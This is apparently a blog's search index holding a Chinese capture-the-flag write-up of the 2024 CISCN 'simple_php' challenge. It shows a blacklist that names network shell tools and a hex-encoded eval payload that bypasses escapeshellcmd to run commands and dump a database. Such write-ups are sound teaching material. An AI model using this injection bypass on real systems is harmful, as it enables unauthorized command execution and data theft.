<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2024 ciscn 华北赛区初赛试题复现</title>
      <link href="/2024/07/02/2024-ciscn-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%E5%88%9D%E8%B5%9B%E8%AF%95%E9%A2%98%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/07/02/2024-ciscn-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%E5%88%9D%E8%B5%9B%E8%AF%95%E9%A2%98%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="2024CISCN-web方向题目复现与知识点梳理"><a href="#2024CISCN-web方向题目复现与知识点梳理" class="headerlink" title="2024CISCN web方向题目复现与知识点梳理"></a>2024CISCN web方向题目复现与知识点梳理</h1><h2 id="1-simple-php"><a href="#1-simple-php" class="headerlink" title="1.simple_php"></a>1.simple_php</h2><p>非常狗的一道题<br>先看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); </span><br><span class="line">     <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">         <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过post方式传入cmd参数与题目环境交互。<br>传入的cmd被套了一层<strong>escapeshellcmd</strong>函数后赋值给cmd，接着进行一个黑名单过滤。非常全面的一个黑名单…几乎把所有能用的都过滤掉了。最后执行cmd的命令。</p><hr><p>很简单的代码逻辑，难处在于如何绕过这两次过滤。<br>先来看第一层过滤：escapeshellcmd</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">escapeshellcmd</span>(<span class="keyword">string</span> <span class="variable">$command</span>): <span class="keyword">string</span></span><br></pre></td></tr></table></figure><p>传入一个字符串参数，返回一个字符串参数。这是一个php自带的防止命令注入的函数，php文档对其的解释如下：</p><blockquote><p>“反斜线（\）会在以下字符之前插入：&amp;#;&#96;|*?~&lt;&gt;^()[]{}$\、\x0A 和 \xFF。 ‘ 和 “ 仅在不配对儿的时候被转义。”</p></blockquote><p>这也就导致这题难以通过特殊符号相关的方法来绕过黑名单，比如亦或的无符号rce等待。</p><p>下面的正则匹配就比较简单了。就是屏蔽了一些关键字。目前笔者发现还能用的命令有: man,diff,php,rev,paste,dd if&#x3D;</p><p>其中除了php以外都只能读取文件，diff命令比较好用的一点-r是他可以比较子目录中的文件。不过比较一番也没有找到。只能试着用php命令去连接数据可试试了。这里给出php命令的解释和使用方式。</p><pre><code>&gt;-r 执行代码，无需脚本标记 &gt;-f 执行文件</code></pre><p>个人感觉比较常用的以上两个选项。这里可以用php -r来执行代码。<br>测试php -r phpinfo();发现可以跑通</p><p><img src="/../../source/images/img_simphp.png" alt="img1"></p><p>但是如果使用system执行系统命令，还是会被上面的黑名单过滤，(甚至连引号都过滤掉了)因此使用hex2bin函数来进行绕过。hex2bin可以把输入的十六进制ascii码转换为字符串。这里先给出payload再做解释</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="keyword">eval</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">substr</span>(_hex,<span class="number">1</span>)));</span><br></pre></td></tr></table></figure><p>eval就不做解释了。这里主要解释为什么hex2bin里面要套一个substr。substr()函数输入三个参数：string,start,length。分别是待处理的字符串，开始位置，截取长度。第三个参数可以缺省，即输出从开始位置到结束的所有字符串。</p><p>这里调用这个函数的主要目的是：在没有但双引号的情况下，构造字符串。因为hex2bin的输入要求是引号包裹的字符串，但这里把引号ban了，就要用到substr了。substr允许输入没有引号包裹的字符串，并且输出一个字符串。这也就是说我们可以借用substr来实现无引号字符串的构建。测试一下whoami，发现正常回显，呢么接下来就是无聊的查库时间了。</p><p><img src="/../../source/images/simphp_test.png" alt="img1"></p><p>这个地方没啥技术含量，直接给出最终payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=php -r <span class="keyword">eval</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">substr</span>(_6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d652027757365205048505f434d533b73686f77207461626c65733b73656c656374202a2066726f6d20463161675f5365335265373b27603b,<span class="number">1</span>)));</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>国护面试经验分享</title>
      <link href="/2024/07/02/%E5%9B%BD%E6%8A%A4%E9%9D%A2%E8%AF%95%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/"/>
      <url>/2024/07/02/%E5%9B%BD%E6%8A%A4%E9%9D%A2%E8%AF%95%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
